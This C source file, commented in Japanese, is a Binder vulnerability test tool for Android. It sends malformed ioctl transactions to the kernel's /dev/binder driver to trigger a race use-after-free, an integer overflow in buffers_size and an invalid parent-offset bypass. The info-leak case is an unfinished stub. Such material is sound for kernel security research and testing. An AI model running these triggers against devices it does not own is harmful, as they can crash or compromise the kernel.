/*
 * binder_test.c - Binder 脆弱性検証ツール
 * コンパイル: ndk-build または gcc -static
 * 実行: adb shell /data/local/tmp/binder_test [testcase]
 *  testcase: race, overflow, offset, infoleak, all
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <time.h>
#include <linux/ioctl.h>

// Binder ユーザー空間ヘッダ (カーネルと同じ定義を流用)
#include "binder.h"  // 提供された binder.h を include

#define BINDER_DEVICE "/dev/binder"
#define BINDER_BUFFER_SIZE (256 * 1024)

static int binder_fd = -1;
static void *binder_mmap = NULL;
static volatile int running = 1;

// ヘルパー関数
static void binder_check(int ret, const char *msg) {
    if (ret < 0) {
        perror(msg);
        exit(1);
    }
}

static void binder_open() {
    binder_fd = open(BINDER_DEVICE, O_RDWR);
    binder_check(binder_fd, "open binder");
    // バージョンチェック
    struct binder_version ver;
    int ret = ioctl(binder_fd, BINDER_VERSION, &ver);
    binder_check(ret, "BINDER_VERSION");
    printf("Binder protocol version: %d\n", ver.protocol_version);
    // mmap
    binder_mmap = mmap(NULL, BINDER_BUFFER_SIZE, PROT_READ | PROT_WRITE,
                       MAP_SHARED, binder_fd, 0);
    binder_check(binder_mmap == MAP_FAILED ? -1 : 0, "mmap");
    printf("mmap at %p\n", binder_mmap);
}

static void binder_close() {
    if (binder_mmap) munmap(binder_mmap, BINDER_BUFFER_SIZE);
    if (binder_fd >= 0) close(binder_fd);
}

// コンテキストマネージャ設定 (BINDER_SET_CONTEXT_MGR)
static void set_context_mgr() {
    int ret = ioctl(binder_fd, BINDER_SET_CONTEXT_MGR, 0);
    if (ret < 0) printf("set_context_mgr failed (may already set): %s\n", strerror(errno));
    else printf("context manager set\n");
}

// トランザクション送信 (同期)
static void send_transaction(uint32_t handle, uint32_t code,
                             const void *data, size_t data_size,
                             const void *offsets, size_t offsets_size,
                             int reply) {
    struct binder_transaction_data tr = {0};
    tr.target.handle = handle;
    tr.code = code;
    tr.flags = reply ? 0 : TF_ONE_WAY;
    tr.data_size = data_size;
    tr.offsets_size = offsets_size;
    tr.data.ptr.buffer = (uintptr_t)data;
    tr.data.ptr.offsets = (uintptr_t)offsets;

    uint32_t cmd = reply ? BC_REPLY : BC_TRANSACTION;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd) + sizeof(tr),
        .write_consumed = 0,
        .write_buffer = (uintptr_t)&cmd,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };
    // 実際の write バッファに cmd + tr を連結
    uint8_t write_buf[sizeof(cmd) + sizeof(tr)];
    memcpy(write_buf, &cmd, sizeof(cmd));
    memcpy(write_buf + sizeof(cmd), &tr, sizeof(tr));
    bwr.write_buffer = (uintptr_t)write_buf;
    bwr.write_size = sizeof(write_buf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    if (ret < 0) {
        perror("BINDER_WRITE_READ (write)");
    } else {
        printf("Transaction sent, write_consumed=%llu\n", (unsigned long long)bwr.write_consumed);
    }
}

// ===== テストケース =====

// 1. 競合 UAF: 複数スレッドでトランザクションを連投しながらターゲットプロセスを終了
void *race_thread(void *arg) {
    int tid = (intptr_t)arg;
    printf("race_thread %d started\n", tid);
    // 適当なハンドル (0 は context manager)
    uint32_t handle = 0;
    char data[64] = {0};
    for (int i = 0; i < 1000 && running; i++) {
        send_transaction(handle, 0x1234, data, sizeof(data), NULL, 0, 0);
        usleep(10);
    }
    return NULL;
}

static void test_race() {
    printf("=== Test Race UAF ===\n");
    const int NUM_THREADS = 4;
    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_create(&threads[i], NULL, race_thread, (void*)(intptr_t)i);
    }
    // 5秒後にターゲットプロセスを終了 (ここでは自分自身のプロセスを終了させるわけにはいかないので、
    // 実際には別の binder プロセスを作成して kill する必要があるが、簡易版ではシグナルを送る)
    // 代わりに子プロセスを作成し、そこにトランザクションを送りつけて殺す。
    pid_t child = fork();
    if (child == 0) {
        // 子プロセス: binder を開いてループ
        binder_open();
        set_context_mgr(); // コンテキストマネージャとして振る舞う
        while (1) pause();
        exit(0);
    } else {
        sleep(2);
        printf("Killing child process %d\n", child);
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
    }
    sleep(1);
    running = 0;
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("Race test done\n");
}

// 2. 整数オーバーフロー: 巨大な buffers_size を指定
static void test_overflow() {
    printf("=== Test Integer Overflow ===\n");
    // BC_TRANSACTION_SG を使う
    struct binder_transaction_data_sg tr_sg = {0};
    tr_sg.transaction_data.target.handle = 0;
    tr_sg.transaction_data.code = 0x5678;
    tr_sg.transaction_data.flags = TF_ONE_WAY;
    tr_sg.transaction_data.data_size = 0;
    tr_sg.transaction_data.offsets_size = 0;
    tr_sg.buffers_size = 0xFFFFFFFFFFFFFFFFULL; // 最大値
    // 実際に送信
    uint32_t cmd = BC_TRANSACTION_SG;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd) + sizeof(tr_sg),
        .write_consumed = 0,
        .write_buffer = (uintptr_t)&cmd,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };
    uint8_t write_buf[sizeof(cmd) + sizeof(tr_sg)];
    memcpy(write_buf, &cmd, sizeof(cmd));
    memcpy(write_buf + sizeof(cmd), &tr_sg, sizeof(tr_sg));
    bwr.write_buffer = (uintptr_t)write_buf;
    bwr.write_size = sizeof(write_buf);

    int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("ioctl returned %d (expected error or crash)\n", ret);
}

// 3. オフセット検証バイパス
static void test_offset_bypass() {
    printf("=== Test Offset Bypass ===\n");
    // 無効な親オフセットを含むバッファオブジェクトを構築
    struct {
        struct binder_buffer_object obj;
        uint32_t dummy;
    } __attribute__((packed)) buf_obj;
    memset(&buf_obj, 0, sizeof(buf_obj));
    buf_obj.obj.hdr.type = BINDER_TYPE_PTR;
    buf_obj.obj.flags = BINDER_BUFFER_FLAG_HAS_PARENT;
    buf_obj.obj.buffer = 0x1000;
    buf_obj.obj.length = 16;
    buf_obj.obj.parent = 0; // オフセット配列のインデックス 0 を指定 (不正)
    buf_obj.obj.parent_offset = 0xFFFF; // 親バッファの範囲外

    // オフセット配列を作成（親オブジェクトを指す）
    binder_size_t offsets[] = { 0 }; // オフセット 0 に buf_obj があると仮定
    // 実際のデータは buf_obj を含む
    send_transaction(0, 0x9ABC, &buf_obj, sizeof(buf_obj), offsets, sizeof(offsets), 0);
}

// 4. 情報漏洩: 受信データのパディングを検査
static void test_infoleak() {
    printf("=== Test Info Leak ===\n");
    // コンテキストマネージャにトランザクションを送り、返信を受け取る
    // 簡易的に自分自身に送る (ハンドル 0)
    // まずは受信用のバッファを用意
    struct binder_write_read bwr = {0};
    uint8_t read_buf[1024];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (uintptr_t)read_buf;
    // 送信は test_race と同様に send_transaction を使うが、返信を待つために TF_ONE_WAY を外す
    // ただし、返信を受け取るには読み込みループが必要。ここでは簡易版として、ioctl を呼び出すだけ。
    // 完全な実装は複雑なので割愛。
    printf("Info leak test requires more complex setup; check for uninitialized padding in received data.\n");
}

// ===== メイン =====
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s [race|overflow|offset|infoleak|all]\n", argv[0]);
        return 1;
    }

    binder_open();
    // set_context_mgr(); // 必要に応じて

    const char *test = argv[1];
    if (strcmp(test, "race") == 0) test_race();
    else if (strcmp(test, "overflow") == 0) test_overflow();
    else if (strcmp(test, "offset") == 0) test_offset_bypass();
    else if (strcmp(test, "infoleak") == 0) test_infoleak();
    else if (strcmp(test, "all") == 0) {
        test_race();
        test_overflow();
        test_offset_bypass();
        test_infoleak();
    } else {
        fprintf(stderr, "Unknown test: %s\n", test);
    }

    binder_close();
    return 0;
}
